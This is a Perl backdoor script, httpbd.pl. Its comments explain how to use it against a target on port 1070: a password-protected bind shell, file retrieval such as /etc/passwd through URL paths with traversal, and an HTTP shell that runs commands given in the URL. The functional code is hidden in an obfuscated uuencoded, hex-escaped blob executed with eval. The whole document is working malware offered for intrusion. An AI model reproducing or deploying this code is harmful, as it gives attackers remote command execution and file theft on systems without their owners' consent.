#usr/bin/perl
# httpbd.pl Usage:
# 1. bind shell:
# nc target 1070
# ->SHELLPASSWORD{ENTER}{ENTER}
# 2. download files
# http://target:1070/file?/etc/passwd
# or
# http://target:1070/file?../some/file
# 3. http shell
# http://target:1070/shell?id;uname -a
eval unpack u=>q{_"@H*"G5S92!3;V-K970["@HD4TA%3$P](EQX,D9<>#8R7'@V.5QX-D5<>#)&7'@W,UQX-CA<>#(P7'@R1%QX_-CDB.PHD4TA%3$Q005-35T]21#TB7'@V,C!<>#<R7'@W-5QX,S<P(CL*)$Q)4U1%3E!/4E0](EQX,S$P7'@S_-S`B.PHD2%144$9)3$5#340](EQX-C9<>#8Y7'@V0UQX-C4B.PHD2%144%-(14Q,0TU$/2)<>#<S7'@V.%QX_-C5<>#9#7'@V0R(["@HD2%144#0P-#T@(EQX-#A<>#4T7'@U-%QX-3!<>#)&7'@S,5QX,D5<>#,Q7'@R,%QX_,S0P7'@S-%QX,C!<>#1%7'@V1EQX-S1<>#(P7'@T-EQX-D9<>#<U7'@V15QX-C1<;B(@+@HB7'@T-%QX-C%<_>#<T7'@V-5QX,T%<>#(P7'@T1%QX-D9<>#9%7'@R0UQX,C!<>#,Q7'@S-%QX,C!<>#1!7'@V,5QX-D5<>#(P_7'@S,C`P7'@S,EQX,C`P7'@S,UQX,T%<>#,Q7'@S.5QX,T%<>#,U7'@S-5QX,C!<>#0W7'@T1%QX-31<;B(@_+@HB7'@U,UQX-C5<>#<R7'@W-EQX-C5<>#<R7'@S05QX,C!<>#0Q7'@W,%QX-C%<>#8S7'@V.%QX-C5<>#)&_7'@S,5QX,D5<>#,S7'@R15QX,S)<>#,R7'@R,%QX,CA<>#4U7'@V15QX-CE<>#<X7'@R.5QN(B`N"B)<>#0S_7'@V1EQX-D5<>#9%7'@V-5QX-C-<>#<T7'@V.5QX-D9<>#9%7'@S05QX,C!<>#8S7'@V0UQX-D9<>#<S7'@V_-5QN(B`N"B)<>#0S7'@V1EQX-D5<>#<T7'@V-5QX-D5<>#<T7'@R1%QX-31<>#<Y7'@W,%QX-C5<>#-!7'@R_,%QX-S1<>#8U7'@W.%QX-S1<>#)&7'@V.%QX-S1<>#9$7'@V0UQN7&XB("X*(EQX,T-<>#(Q7'@T-%QX-$9<_>#0S7'@U-%QX-3E<>#4P7'@T-5QX,C!<>#0X7'@U-%QX-$1<>#1#7'@R,%QX-3!<>#4U7'@T,EQX-$-<>#0Y_7'@T,UQX,C!<(EQX,D1<>#)&7'@R1EQX-#E<>#0U7'@U-%QX-#9<>#)&7'@R1EQX-#1<>#4T7'@T-%QX,C!<_>#0X7'@U-%QX-$1<>#1#7'@R,%QX,S1<>#)%,%QX,D9<>#)&7'@T-5QX-$5<(EQX,T5<;B(@+@HB7'@S0UQX_-#A<>#4T7'@T1%QX-$-<>#-%7'@S0UQX-#A<>#0U7'@T,5QX-#1<>#-%7&XB("X*(EQX,T-<>#4T7'@T.5QX_-31<>#1#7'@T-5QX,T5<>#,T,%QX,S1<>#(P7'@T15QX-D9<>#<T7'@R,%QX-#9<>#9&7'@W-5QX-D5<>#8T_7'@S0UQX,D9<>#4T7'@T.5QX-31<>#1#7'@T-5QX,T5<;B(@+@HB7'@S0UQX,D9<>#0X7'@T-5QX-#%<>#0T_7'@S15QX,T-<>#0R7'@T1EQX-#1<>#4Y7'@S15QN(B`N"B)<>#!!7'@T15QX-D9<>#<T7'@R,%QX-#9<>#9&_7'@W-5QX-D5<>#8T7'@P05QN(B`N"B)<>#4T7'@V.%QX-C5<>#(P7'@W,EQX-C5<>#<Q7'@W-5QX-C5<>#<S_7'@W-%QX-C5<>#8T7'@R,%QX-35<>#4R7'@T0UQX,C!<>#<W7'@V,5QX-S-<>#(P7'@V15QX-D9<>#<T7'@R_,%QX-C9<>#9&7'@W-5QX-D5<>#8T7'@R,%QX-D9<>#9%7'@R,%QX-S1<>#8X7'@V.5QX-S-<>#(P7'@W,UQX_-C5<>#<R7'@W-EQX-C5<>#<R7'@R15QX,$%<>#!!7&XB("X*(EQX,$%<;B(@+@HB7'@S0UQX-#%<>#0T7'@T_-%QX-3)<>#0U7'@U,UQX-3-<>#-%7'@T,5QX-S!<>#8Q7'@V,UQX-CA<>#8U7'@R1EQX,S%<>#)%7'@S,UQX_,D5<>#,R7'@S,EQX,C!<>#4S7'@V-5QX-S)<>#<V7'@V-5QX-S)<>#(P7'@V,5QX-S1<>#(P7'@V0UQX-D9<_>#8S7'@V,5QX-D-<>#8X7'@V1EQX-S-<>#<T7'@R,%QX-3!<>#9&7'@W,EQX-S1<>#(P)$Q)4U1%3E!/4E1<_>#-#7'@R1EQX-#%<>#0T7'@T-%QX-3)<>#0U7'@U,UQX-3-<>#-%7&XB("X*(EQX,T-<>#)&7'@T,EQX-$9<_>#0T7'@U.5QX,T5<>#-#7'@R1EQX-#A<>#4T7'@T1%QX-$-<>#-%7&XB.PH*)$A45%`T,#`](")<>#0X7'@U_-%QX-31<>#4P7'@R1EQX,S%<>#)%7'@S,5QX,C!<>#,T,#!<>#(P7'@T,EQX-C%<>#8T7'@R,%QX-3)<>#8U_7'@W,5QX-S5<>#8U7'@W,UQX-S1<;B(@+@HB7'@U,UQX-C5<>#<R7'@W-EQX-C5<>#<R7'@S05QX,C!<>#0Q_7'@W,%QX-C%<>#8S7'@V.%QX-C5<>#)&7'@S,5QX,D5<>#,S7'@R15QX,S)<>#,R7'@R,%QX,CA<>#4U7'@V_15QX-CE<>#<X7'@R.5QN(B`N"B)<>#0T7'@V,5QX-S1<>#8U7'@S05QX,C!<>#1$7'@V1EQX-D5<>#)#7'@R_,%QX,S%<>#,T7'@R,%QX-$%<>#8Q7'@V15QX,C!<>#,R,#!<>#,R7'@R,#!<>#,S7'@S05QX,S%<>#,Y7'@S_05QX,S5<>#,U7'@R,%QX-#=<>#1$7'@U-%QN(B`N"B)<>#0S7'@V,5QX-C-<>#8X7'@V-5QX,D1<>#0S7'@V_1EQX-D5<>#<T7'@W,EQX-D9<>#9#7'@S05QX,C!<>#9%7'@V1EQX,D1<>#8S7'@V,5QX-C-<>#8X7'@V-5QX_,D-<>#9%7'@V1EQX,D1<>#<S7'@W-%QX-D9<>#<R7'@V-5QN(B`N"B)<>#0S7'@V1EQX-D5<>#9%7'@V-5QX_-C-<>#<T7'@V.5QX-D9<>#9%7'@S05QX,C!<>#8S7'@V0UQX-D9<>#<S7'@V-5QN(B`N"B)<>#0S7'@V1EQX_-D5<>#<T7'@V-5QX-D5<>#<T7'@R1%QX-31<>#<Y7'@W,%QX-C5<>#-!7'@R,%QX-S1<>#8U7'@W.%QX-S1<_>#)&7'@V.%QX-S1<>#9$7'@V0UQN7&XB("X*(EQX,T-<>#(Q7'@T-%QX-$9<>#0S7'@U-%QX-3E<>#4P7'@T_-5QX,C!<>#0X7'@U-%QX-$1<>#1#7'@R,%QX-3!<>#4U7'@T,EQX-$-<>#0Y7'@T,UQX,C!<(EQX,D1<>#)&_7'@R1EQX-#E<>#0U7'@U-%QX-#9<>#)&7'@R1EQX-#1<>#4T7'@T-%QX,C!<>#0X7'@U-%QX-$1<>#1#7'@R_,%QX,S1<>#)%,%QX,D9<>#)&7'@T-5QX-$5<(EQX,T5<;B(@+@HB7'@S0UQX-#A<>#4T7'@T1%QX-$-<>#-%_7'@S0UQX-#A<>#0U7'@T,5QX-#1<>#-%7'@S0UQX-31<>#0Y7'@U-%QX-$-<>#0U7'@S15QX,S0P,%QX,C!<_>#0R7'@V,5QX-C1<>#(P7'@U,EQX-C5<>#<Q7'@W-5QX-C5<>#<S7'@W-%QX,T-<>#)&7'@U-%QX-#E<>#4T_7'@T0UQX-#5<>#-%7'@S0UQX,D9<>#0X7'@T-5QX-#%<>#0T7'@S12(@+@HB7'@S0UQX-#)<>#1&7'@T-%QX_-3E<>#-%(B`N"B)<>#!!7'@S-#`P7'@R,%QX-#)<>#8Q7'@V-%QX,C!<>#4R7'@V-5QX-S%<>#<U7'@V-5QX_-S-<>#<T7'@P05QX-3E<>#9&7'@W-5QX-S)<>#(P7'@W,EQX-C5<>#<Q7'@W-5QX-C5<>#<S7'@W-%QX,C!<_>#8X7'@V,5QX-S-<>#(P7'@V,EQX-C%<>#8T7'@R,%QX-S-<>#<Y7'@V15QX-S1<>#8Q7'@W.%QX,C!<>#9&_7'@W,EQX,C!<>#8Y7'@W,UQX,C!<>#8Y7'@V15QX-CA<>#8U7'@W,EQX-C5<>#9%7'@W-%QX-D-<>#<Y7'@R_,%QX-CE<>#9$7'@W,%QX-D9<>#<S7'@W,UQX-CE<>#8R7'@V0UQX-C5<>#(P7'@W-%QX-D9<>#(P7'@W,UQX_-C%<>#<T7'@V.5QX-S-<>#8V7'@W.5QX,D5<>#-#7'@R1EQX-#)<>#1&7'@T-%QX-3E<>#-%7'@S0UQX,D9<_>#0X7'@U-%QX-$1<>#1#7'@S15QN(CL*"B1(5%10,C`P/2`B7'@T.%QX-31<>#4T7'@U,%QX,D9<>#,Q7'@R_15QX,S%<>#(P7'@S,C`P7'@R,%QX-$9<>#1"7&XB("X*(EQX-#-<>#8Q7'@V,UQX-CA<>#8U7'@R1%QX-#-<_>#9&7'@V15QX-S1<>#<R7'@V1EQX-D-<>#-!7'@R,%QX-D5<>#9&7'@R1%QX-C-<>#8Q7'@V,UQX-CA<>#8U_7'@R0UQX-D5<>#9&7'@R1%QX-S-<>#<T7'@V1EQX-S)<>#8U7&XB("X*(EQX-#-<>#9&7'@V15QX-D5<>#8U_7'@V,UQX-S1<>#8Y7'@V1EQX-D5<>#-!7'@R,%QX-C-<>#9#7'@V1EQX-S-<>#8U7&XB.PH*)'!R;W1O8V]L_/6=E='!R;W1O8GEN86UE*")<>#<T7'@V,UQX-S`B*3L*<V]C:V5T*%,L)E!&7TE.150L)E-/0TM?4U1214%-_+"1P<F]T;V-O;"D@?'P@9&EE(")<>#0S7'@V,5QX-D5<>#<T7'@R,%QX-C-<>#<R7'@V-5QX-C%<>#<T7'@V_-5QX,C!<>#<S7'@V1EQX-C-<>#9"7'@V-5QX-S1<;B(["G-E='-O8VMO<'0H4RQ33TQ?4T]#2T54+%-/7U)%_55-%041$4BPQ*3L*8FEN9"`H4RQS;V-K861D<E]I;B@D3$E35$5.4$]25"Q)3D%$1%)?04Y9*2D@?'P@9&EE_(")<>#0S7'@V,5QX-D5<>#<T7'@R,%QX-D9<>#<P7'@V-5QX-D5<>#(P7'@W,%QX-D9<>#<R7'@W-%QN(CL*_;&ES=&5N("A3+#,I('Q\(&1I92`B7'@T,UQX-C%<>#9%7'@W-%QX,C!<>#9#7'@V.5QX-S-<>#<T7'@V-5QX_-D5<>#(P7'@W,%QX-D9<>#<R7'@W-%QN(CL*=VAI;&4H,2D*>PIA8V-E<'0@*$-/3DXL4RD["FEF*"$@*"1P_:60]9F]R:RDI"GL*9&EE(")<>#0S7'@V,5QX-D5<>#9%7'@V1EQX-S1<>#(P7'@V-EQX-D9<>#<R7'@V0B(@_:68@*"$@9&5F:6YE9"`D<&ED*3L*8VQO<V4@0T].3CL*?0IE;'-E"GL*)&)U9CT\0T].3CX[(&-H;VUP*"1B_=68I.R`D8G5F/7YS+UQR+R]G.PI-,3H*=VAI;&4H)',](#Q#3TY./BD@>PII9B@D<SU^+UY<<C]<;B0O*2![_(&QA<W0@33$[('T*?0II9B@D8G5F(&5Q("132$5,3%!!4U-73U)$*0I["F]P96X@4U1$24XL(EQX,T-<>#(V_7'@T,UQX-$9<>#1%7'@T12(["F]P96X@4U1$3U54+")<>#-%7'@R-EQX-#-<>#1&7'@T15QX-$4B.PIO<&5N_(%-41$524BPB7'@S15QX,C9<>#0S7'@T1EQX-$5<>#1%(CL*97AE8R`D4TA%3$P@?'P@9&EE('!R:6YT($-/_3DX@(EQX-#-<>#8Q7'@V15QX-S1<>#(P7'@V-5QX-SA<>#8U7'@V,UQX-S5<>#<T7'@V-5QX,C`D4TA%3$Q<_;B(["GT*96QS:68H)&)U9CU^+UY'150@7"\D2%144$9)3$5#341</RA;7B!=*RD@2%144%PO,5PN6S`Q720O_*0I["B1F:6QE/20Q.PHD9FEL93U^<R\E*%LP+3EA+69=>S)]*2]C:'(H:&5X*"0Q*2DO9V4["G!R:6YT($-/_3DX@)$A45%`R,#`["G!R:6YT($-/3DX@(EQX-#-<>#9&7'@V15QX-S1<>#8U7'@V15QX-S1<>#)$7'@W-%QX_-SE<>#<P7'@V-5QX,T%<>#(P7'@W-%QX-C5<>#<X7'@W-%QX,D9<>#<P7'@V0UQX-C%<>#8Y7'@V15QN7&XB_.PIO<&5N("A(5%101DE,12PD9FEL92D@?'P@9V]T;R!-,CL*"G=H:6QE*#Q(5%101DE,13XI"GL*<')I;G0@_0T].3B`D7SL*?0IC;&]S92!(5%101DE,13L*?0IE;'-I9B@D8G5F/7XO7D=%5"!<+R1(5%104TA%3$Q#341<_/RA;7B!=*RD@2%144%PO,5PN6S`Q720O*0I["B1S:&-M9#TD,3L*)'-H8VUD/7YS+R4H6S`M.6$M9EU[,GTI_+V-H<BAH97@H)#$I*2]G93L*)&]U=#U@)'-H8VUD8#L*<')I;G0@0T].3B`D2%144#(P,#L*<')I;G0@0T]._3B`B7'@T,UQX-D9<>#9%7'@W-%QX-C5<>#9%7'@W-%QX,D1<>#<T7'@W.5QX-S!<>#8U7'@S05QX,C!<>#<T_7'@V-5QX-SA<>#<T7'@R1EQX-CA<>#<T7'@V1%QX-D-<;EQN(CL*<')I;G0@0T].3B`B7'@S0UQX-C)<>#9&_7'@V-%QX-SE<>#(P7'@V,EQX-C=<>#8S7'@V1EQX-D-<>#9&7'@W,EQX,T1<>#8R7'@V0UQX-C%<>#8S7'@V_0EQX,T5<;EQN(CL*<')I;G0@0T].3B`B7'@P05QX,$$B+B1O=70N(EQX,$%<>#!!7'@S0UQX,D9<>#8R7'@V_1EQX-C1<>#<Y7'@S15QN(CL*?0IE;'-I9B@D8G5F/7XO7D=%5"!<+R!(5%107"\Q7"Y;,#%=)"\I"GL*<')I_;G0@0T].3B`D2%144#(P,#L*<')I;G0@0T].3B`B7'@T,UQX-D9<>#9%7'@W-%QX-C5<>#9%7'@W-%QX,D1<_>#<T7'@W.5QX-S!<>#8U7'@S05QX,C!<>#<T7'@V-5QX-SA<>#<T7'@R1EQX-S!<>#9#7'@V,5QX-CE<>#9%_7&Y<;B(["GT*96QS:68H)&)U9CU^+UY'150@*%PO6UY<+UTK*2L@2%144%PO,5PN6S`Q720O*0I["G!R:6YT_($-/3DX@)$A45%`T,#0["@I]"F5L<V4*>PIP<FEN="!#3TY.("1(5%10-#`P.PI]"DTR.@IC;&]S92!#3TY.-.PIE>&ET(#`["GT*?0}

